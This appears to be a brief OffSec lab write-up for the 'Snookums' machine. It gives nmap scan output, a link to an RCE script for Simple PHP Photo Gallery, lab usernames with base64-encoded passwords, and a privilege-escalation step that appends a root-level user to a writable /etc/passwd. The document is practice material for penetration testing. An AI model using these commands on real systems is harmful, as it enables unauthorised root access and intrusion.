---
title: "Snookums"
date: 2026-03-26
draft: false
description: "OffSec Snookums writeup"
tags: ["linux", "oscp"]
categories: ["CTF Writeups"]
showTableOfContents: true
showReadingTime: true
showWordCount: true
---

# Snookums

## Overview

- **OS:** Linux
- **IP:** 192.168.143.58
- **Difficulty:** Intermediate
- **Platform:** OffSec
- **OSCP:** Yes
- **Lists:** N/A

### Summary

easy RCE and privesc, double b64.

## Loot

| Loot |  |
| --- | --- |
| **Category** | **Details** |
| Usernames |  |
| Passwords |  |
| Usernames+Passwords |  |
| Hashes |  |
| Service Versions |  |

## Enumeration

## Nmap

```
21/tcp    open  ftp         vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.45.159
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp    open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:79:67:12:c7:ec:13:3a:96:bd:d3:b4:7c:f3:95:15 (RSA)
|   256 a8:a3:a7:88:cf:37:27:b5:4d:45:13:79:db:d2:ba:cb (ECDSA)
|_  256 f2:07:13:19:1f:29:de:19:48:7c:db:45:99:f9:cd:3e (ED25519)
80/tcp    open  http        Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Simple PHP Photo Gallery
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp   open  netbios-ssn Samba smbd 4.10.4 (workgroup: SAMBA)
3306/tcp  open  mysql       MySQL (unauthorized)
33060/tcp open  mysqlx      MySQL X protocol listener

```

## Dirbusting

```

```

## Port 80

Web behavior was the main signal here, so I traced each response change before exploitation.

{{< figure src="image 886.png" >}}

## Exploitation

{{< figure src="image 887.png" >}}

[https://github.com/beauknowstech/SimplePHPGal-RCE.py/blob/main/SimplePHPGal-RCE.py](https://github.com/beauknowstech/SimplePHPGal-RCE.py/blob/main/SimplePHPGal-RCE.py)

{{< figure src="image 888.png" >}}

{{< figure src="image 889.png" >}}

MalapropDoffUtilize1337

{{< figure src="image 890.png" >}}

josh VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0=

michael U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==

serena  VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ==

{{< figure src="image 891.png" >}}

MobilizeHissSeedtime747
HockSydneyCertify123
OverallCrestLean000

after ssh into michael we can see that /etc//passwd is writable by us

\

lets generate a password

openssl passwd -1 -salt password password 

$1$password$Da2mWXlxe6J7jtww12SNG/

echo 'owned:$1$password$Da2mWXlxe6J7jtww12SNG/:0:0:owned:/root:/bin/bash' >> /etc/passwd

{{< figure src="image 892.png" >}}
